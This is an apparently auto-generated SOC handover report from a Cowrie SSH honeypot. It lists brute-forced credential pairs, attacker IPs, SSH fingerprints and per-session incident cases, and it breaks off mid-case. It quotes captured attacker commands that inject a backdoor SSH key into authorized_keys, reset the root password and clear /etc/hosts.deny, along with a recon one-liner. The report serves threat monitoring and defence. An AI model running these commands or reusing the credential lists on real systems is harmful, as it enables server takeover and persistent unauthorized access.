# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-07-04 |
| **Generated At** | 2026-07-04T23:02:10Z |
| **Shift Time** | 23:02 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · Oracle Cloud HA · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **306** |
| Confirmed Threats | **235** |
| False Positives Filtered | **71** (23.2%) |
| Unique Attacker IPs | **41** |
| Countries of Origin | **14** |
| High Severity Cases | **84** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **222** |
| Malware Samples Analyzed | **3** HIGH · **37** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **93** |
| Unique Credential Pairs | **69** |
| Unique Usernames | **15** |
| Unique Passwords | **51** |
| Successful Auth Pairs | **87** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 54 |
| `admin` | 14 |
| `345gs5662d34` | 6 |
| `support` | 3 |
| `xinyufeng` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 6 |
| `3245gs5662d34` | 6 |
| `admin` | 6 |
| `12345` | 4 |
| `123456` | 3 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 6 |
| `root` | `3245gs5662d34` | 4 |
| `support` | `support` | 3 |
| `admin` | `admin` | 3 |
| `root` | `P@$$wOrd` | 3 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `321` | `195.178.110.228` | 2026-07-04T20:56:37 |
| `root` | `hk123456` | `118.26.36.195` | 2026-07-04T20:56:59 |
| `345gs5662d34` | `345gs5662d34` | `118.26.36.195` | 2026-07-04T20:57:03 |
| `root` | `3245gs5662d34` | `118.26.36.195` | 2026-07-04T20:57:05 |
| `root` | `4321` | `195.178.110.228` | 2026-07-04T20:59:32 |
| `john` | `123456` | `45.198.224.120` | 2026-07-04T21:01:05 |
| `xinyufeng` | `xinyufeng` | `185.242.3.195` | 2026-07-04T21:04:56 |
| `xinyufeng` | `xinyufeng` | `10.0.0.73` | 2026-07-04T21:08:33 |
| `root` | `asdfghjk` | `45.198.224.120` | 2026-07-04T21:12:55 |
| `support` | `support` | `176.53.159.196` | 2026-07-04T21:23:45 |
| `root` | `QWER1234` | `45.198.224.120` | 2026-07-04T21:24:47 |
| `support` | `support` | `10.0.0.73` | 2026-07-04T21:25:04 |
| `oracle` | `oracle12` | `36.64.68.99` | 2026-07-04T21:26:53 |
| `345gs5662d34` | `345gs5662d34` | `36.64.68.99` | 2026-07-04T21:26:57 |
| `oracle` | `3245gs5662d34` | `36.64.68.99` | 2026-07-04T21:26:59 |
| `administrator` | `ubuntu` | `128.14.225.164` | 2026-07-04T21:29:39 |
| `345gs5662d34` | `345gs5662d34` | `128.14.225.164` | 2026-07-04T21:29:42 |
| `administrator` | `3245gs5662d34` | `128.14.225.164` | 2026-07-04T21:29:42 |
| `admin` | `admin` | `10.0.0.73` | 2026-07-04T21:32:25 |
| `root` | `diamond` | `45.198.224.120` | 2026-07-04T21:36:27 |
| `root` | `pbxadmin` | `95.182.83.157` | 2026-07-04T21:40:41 |
| `345gs5662d34` | `345gs5662d34` | `95.182.83.157` | 2026-07-04T21:40:46 |
| `root` | `3245gs5662d34` | `95.182.83.157` | 2026-07-04T21:40:48 |
| `root` | `calm$123` | `101.126.67.255` | 2026-07-04T21:45:20 |
| `root` | `pbxadmin` | `160.187.180.146` | 2026-07-04T21:47:36 |
| `root` | `!@12qwas` | `95.165.27.83` | 2026-07-04T21:47:39 |
| `345gs5662d34` | `345gs5662d34` | `160.187.180.146` | 2026-07-04T21:47:40 |
| `345gs5662d34` | `345gs5662d34` | `95.165.27.83` | 2026-07-04T21:47:42 |
| `root` | `3245gs5662d34` | `160.187.180.146` | 2026-07-04T21:47:42 |
| `root` | `3245gs5662d34` | `95.165.27.83` | 2026-07-04T21:47:43 |
| `jinyutian` | `jinyutian` | `45.198.224.120` | 2026-07-04T21:48:22 |
| `root` | `P@$$wOrd` | `185.242.3.195` | 2026-07-04T21:59:43 |
| `ubuntu` | `1qaz@wsx` | `45.198.224.120` | 2026-07-04T22:00:16 |
| `root` | `admin` | `192.42.116.19` | 2026-07-04T22:07:00 |
| `ubuntu` | `pass123` | `45.198.224.120` | 2026-07-04T22:12:09 |
| `web` | `a12345` | `45.198.224.120` | 2026-07-04T22:23:50 |
| `root` | `1` | `195.178.110.217` | 2026-07-04T22:26:22 |
| `root` | `12` | `195.178.110.217` | 2026-07-04T22:28:17 |
| `root` | `123` | `195.178.110.217` | 2026-07-04T22:30:14 |
| `root` | `1234` | `195.178.110.217` | 2026-07-04T22:32:13 |
| `root` | `12345` | `195.178.110.217` | 2026-07-04T22:34:08 |
| `root` | `q1w2e` | `45.198.224.120` | 2026-07-04T22:35:17 |
| `root` | `1234567` | `195.178.110.217` | 2026-07-04T22:38:03 |
| `root` | `admin` | `45.15.226.44` | 2026-07-04T22:39:37 |
| `root` | `12345678` | `195.178.110.217` | 2026-07-04T22:39:50 |
| `root` | `P@$$wOrd` | `10.0.0.73` | 2026-07-04T22:40:11 |
| `root` | `123456789` | `195.178.110.217` | 2026-07-04T22:41:49 |
| `root` | `1234567890` | `195.178.110.217` | 2026-07-04T22:43:52 |
| `root` | `123qwe` | `195.178.110.217` | 2026-07-04T22:45:48 |
| `dell` | `123456` | `45.198.224.120` | 2026-07-04T22:46:42 |
| `root` | `` | `85.121.177.73` | 2026-07-04T22:46:59 |
| `root` | `admin` | `85.121.177.73` | 2026-07-04T22:47:01 |
| `admin` | `admin` | `85.121.177.73` | 2026-07-04T22:47:02 |
| `admin` | `` | `85.121.177.73` | 2026-07-04T22:47:03 |
| `root` | `12345` | `85.121.177.73` | 2026-07-04T22:47:04 |
| `root` | `password` | `85.121.177.73` | 2026-07-04T22:47:05 |
| `user` | `user` | `85.121.177.73` | 2026-07-04T22:47:06 |
| `guest` | `guest` | `85.121.177.73` | 2026-07-04T22:47:07 |
| `admin` | `12345` | `85.121.177.73` | 2026-07-04T22:47:08 |
| `root` | `default` | `85.121.177.73` | 2026-07-04T22:47:09 |
| `admin` | `password` | `85.121.177.73` | 2026-07-04T22:47:10 |
| `root` | `1234` | `85.121.177.73` | 2026-07-04T22:47:11 |
| `admin` | `1234` | `85.121.177.73` | 2026-07-04T22:47:12 |
| `root` | `toor` | `85.121.177.73` | 2026-07-04T22:47:13 |
| `root` | `P@ssw0rd` | `85.121.177.73` | 2026-07-04T22:47:14 |
| `root` | `Passw0rd` | `85.121.177.73` | 2026-07-04T22:47:15 |
| `admin` | `P@ssw0rd` | `85.121.177.73` | 2026-07-04T22:47:16 |
| `root` | `changeme` | `85.121.177.73` | 2026-07-04T22:47:18 |
| `admin` | `changeme` | `85.121.177.73` | 2026-07-04T22:47:19 |
| `support` | `support` | `85.121.177.73` | 2026-07-04T22:47:20 |
| `user` | `12345` | `85.121.177.73` | 2026-07-04T22:47:21 |
| `root` | `7ujMko0admin` | `85.121.177.73` | 2026-07-04T22:47:22 |
| `root` | `Zte521` | `85.121.177.73` | 2026-07-04T22:47:23 |
| `admin` | `Zte521` | `85.121.177.73` | 2026-07-04T22:47:24 |
| `root` | `Huawei123` | `85.121.177.73` | 2026-07-04T22:47:25 |
| `admin` | `Huawei123` | `85.121.177.73` | 2026-07-04T22:47:26 |
| `root` | `ZHONGTIAN` | `85.121.177.73` | 2026-07-04T22:47:27 |
| `admin` | `ZHONGTIAN` | `85.121.177.73` | 2026-07-04T22:47:28 |
| `root` | `Vtech123` | `85.121.177.73` | 2026-07-04T22:47:29 |
| `admin` | `Vtech123` | `85.121.177.73` | 2026-07-04T22:47:30 |
| `root` | `MOTOROLA` | `85.121.177.73` | 2026-07-04T22:47:31 |
| `admin` | `MOTOROLA` | `85.121.177.73` | 2026-07-04T22:47:32 |
| `root` | `123qwerty` | `195.178.110.217` | 2026-07-04T22:47:45 |
| `root` | `21` | `195.178.110.217` | 2026-07-04T22:49:46 |
| `root` | `321` | `195.178.110.217` | 2026-07-04T22:51:47 |
| `root` | `4321` | `195.178.110.217` | 2026-07-04T22:53:49 |
| `aman` | `123` | `175.6.109.238` | 2026-07-04T22:54:47 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **306** |
| Sessions with Fingerprint | **15** |
| Unique HASSH Fingerprints | **15** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| Go SSH scanner | 36 |
| libssh | 34 |
| OpenSSH | 8 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 21 | 9 |
| `2ec37a7cc8da...` | Mirai/variant | 17 | 2 |
| `16443846184e...` | Generic scanner | 13 | 2 |
| `a984ff804585...` | libssh-based | 5 | 1 |
| `af8223ac9914...` | libssh-based | 3 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 21 | 9 | Mirai/variant |
| `2ec37a7cc8da...` | Go SSH scanner | 17 | 2 | Mirai/variant |
| `16443846184e...` | Go SSH scanner | 13 | 2 | Generic scanner |
| `95420f9d932d...` | libssh | 9 | 3 | — |
| `a984ff804585...` | OpenSSH | 5 | 1 | libssh-based |
| `af8223ac9914...` | libssh | 3 | 1 | libssh-based |
| `98f63c4d9c87...` | Go SSH scanner | 2 | 2 | Generic scanner |
| `e54ef3ec27fe...` | Go SSH scanner | 2 | 1 | Generic scanner |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **6** |
| Campaign Clusters | **3** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **Recon Loader Script** | 🟡 MEDIUM | 16 | 2 | `T1082, T1592, T1078, T1083` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 6 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:Hl3ZJvKC35Dx"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `101.126.67.255`

**🟡 MEDIUM · Recon Loader Script**

> Multi-stage recon script. Exports PATH, fingerprints host, returns data to C2 loader.

Representative commands:
```
export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una
```
```
uname -s -v -n -m 2 > /dev/null
```
```
/bin/uname -s -v -n -m 2 > /dev/null
```
```
/usr/bin/uname -s -v -n -m 2 > /dev/null
```
```
busybox uname -s -v -n -m 2 > /dev/null
```
Source IPs: `195.178.110.228`, `195.178.110.217`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `95.182.83.157`, `128.14.225.164`, `95.165.27.83`, `36.64.68.99`, `160.187.180.146`, `118.26.36.195`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **41** |
| Unique ASNs | **33** |
| High-Risk ASNs | **29** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS396982` | Google LLC | 3 | LOW |
| `AS135377` | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | 3 | HIGH |
| `AS14061` | DigitalOcean, LLC | 3 | HIGH |
| `AS48090` | TECHOFF SRV LIMITED | 2 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 2 | HIGH |
| `AS14670` | WHG Hosting Services Ltd | 1 | MEDIUM |
| `AS7488` | CNServer LLC | 1 | HIGH |
| `AS37963` | Hangzhou Alibaba Advertising Co.,Ltd. | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (84)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-81e1a0533252

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-04 20:56 |
| **Last Seen** | 2026-07-04 20:56 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:56:34` | `cowrie.session.connect` |
| `2026-07-04 20:56:35` | `cowrie.client.version` |
| `2026-07-04 20:56:35` | `cowrie.client.kex` |
| `2026-07-04 20:56:37` | `cowrie.login.success` |
| `2026-07-04 20:56:38` | `cowrie.session.params` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:38` | `cowrie.command.success` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:38` | `cowrie.command.input` |
| `2026-07-04 20:56:39` | `cowrie.log.closed` |
| `2026-07-04 20:56:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a35aacdedc95

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-07-04 20:56 |
| **Last Seen** | 2026-07-04 20:57 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:56:58` | `cowrie.session.connect` |
| `2026-07-04 20:56:58` | `cowrie.client.version` |
| `2026-07-04 20:56:58` | `cowrie.client.kex` |
| `2026-07-04 20:56:59` | `cowrie.login.success` |
| `2026-07-04 20:57:00` | `cowrie.session.params` |
| `2026-07-04 20:57:00` | `cowrie.command.input` |
| `2026-07-04 20:57:00` | `cowrie.command.failed` |
| `2026-07-04 20:57:01` | `cowrie.log.closed` |
| `2026-07-04 20:57:02` | `cowrie.session.params` |
| `2026-07-04 20:57:02` | `cowrie.command.input` |
| `2026-07-04 20:57:02` | `cowrie.session.file_download` |
| `2026-07-04 20:57:02` | `cowrie.log.closed` |
| `2026-07-04 20:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d32f3d5649b4

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-07-04 20:57 |
| **Last Seen** | 2026-07-04 20:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:57:02` | `cowrie.session.connect` |
| `2026-07-04 20:57:02` | `cowrie.client.version` |
| `2026-07-04 20:57:03` | `cowrie.client.kex` |
| `2026-07-04 20:57:03` | `cowrie.login.success` |
| `2026-07-04 20:57:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f42031298b63

| Field | Detail |
|---|---|
| **Source IP** | `118.26.36[.]195` |
| **First Seen** | 2026-07-04 20:57 |
| **Last Seen** | 2026-07-04 20:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:57:04` | `cowrie.session.connect` |
| `2026-07-04 20:57:04` | `cowrie.client.version` |
| `2026-07-04 20:57:04` | `cowrie.client.kex` |
| `2026-07-04 20:57:05` | `cowrie.login.success` |
| `2026-07-04 20:57:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `118.26.36[.]195` to AbuseIPDB if not already reported
- [ ] Block `118.26.36[.]195` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f41e03cd7ba9

| Field | Detail |
|---|---|
| **Source IP** | `195.178.110[.]228` |
| **First Seen** | 2026-07-04 20:59 |
| **Last Seen** | 2026-07-04 20:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1078 · T1083 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 20:59:32` | `cowrie.session.connect` |
| `2026-07-04 20:59:32` | `cowrie.client.version` |
| `2026-07-04 20:59:32` | `cowrie.client.kex` |
| `2026-07-04 20:59:32` | `cowrie.login.success` |
| `2026-07-04 20:59:33` | `cowrie.session.params` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.command.success` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.command.input` |
| `2026-07-04 20:59:33` | `cowrie.log.closed` |
| `2026-07-04 20:59:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.178.110[.]228` to AbuseIPDB if not already reported
- [ ] Block `195.178.110[.]228` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3212f086270e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 21:00 |
| **Last Seen** | 2026-07-04 21:01 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:00:58` | `cowrie.session.connect` |
| `2026-07-04 21:00:59` | `cowrie.client.version` |
| `2026-07-04 21:00:59` | `cowrie.client.kex` |
| `2026-07-04 21:01:05` | `cowrie.login.success` |
| `2026-07-04 21:01:09` | `cowrie.session.params` |
| `2026-07-04 21:01:09` | `cowrie.command.input` |
| `2026-07-04 21:01:10` | `cowrie.log.closed` |
| `2026-07-04 21:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6adb73a74250

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-04 21:04 |
| **Last Seen** | 2026-07-04 21:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:04:56` | `cowrie.session.connect` |
| `2026-07-04 21:04:56` | `cowrie.client.version` |
| `2026-07-04 21:04:56` | `cowrie.client.kex` |
| `2026-07-04 21:04:56` | `cowrie.login.success` |
| `2026-07-04 21:04:57` | `cowrie.session.params` |
| `2026-07-04 21:04:57` | `cowrie.command.input` |
| `2026-07-04 21:04:57` | `cowrie.log.closed` |
| `2026-07-04 21:04:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0bcf896e6bf5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 21:12 |
| **Last Seen** | 2026-07-04 21:13 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:12:47` | `cowrie.session.connect` |
| `2026-07-04 21:12:49` | `cowrie.client.version` |
| `2026-07-04 21:12:49` | `cowrie.client.kex` |
| `2026-07-04 21:12:55` | `cowrie.login.success` |
| `2026-07-04 21:12:59` | `cowrie.session.params` |
| `2026-07-04 21:12:59` | `cowrie.command.input` |
| `2026-07-04 21:13:01` | `cowrie.log.closed` |
| `2026-07-04 21:13:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae295649c34

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-04 21:23 |
| **Last Seen** | 2026-07-04 21:23 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:23:45` | `cowrie.session.connect` |
| `2026-07-04 21:23:45` | `cowrie.client.version` |
| `2026-07-04 21:23:45` | `cowrie.client.kex` |
| `2026-07-04 21:23:45` | `cowrie.login.success` |
| `2026-07-04 21:23:45` | `cowrie.direct-tcpip.request` |
| `2026-07-04 21:23:45` | `cowrie.direct-tcpip.data` |
| `2026-07-04 21:23:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c53bb04507b2

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-04 21:24 |
| **Last Seen** | 2026-07-04 21:24 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-04 21:24:39` | `cowrie.session.connect` |
| `2026-07-04 21:24:40` | `cowrie.client.version` |
| `2026-07-04 21:24:40` | `cowrie.client.kex` |
| `2026-07-04 21:24:47` | `cowrie.login.success` |
| `2026-07-04 21:24:51` | `cowrie.session.params` |
| `2026-07-04 21:24:51` | `cowrie.command.input` |
| `2026-07-04 21:24:52` | `cowrie.log.closed` |
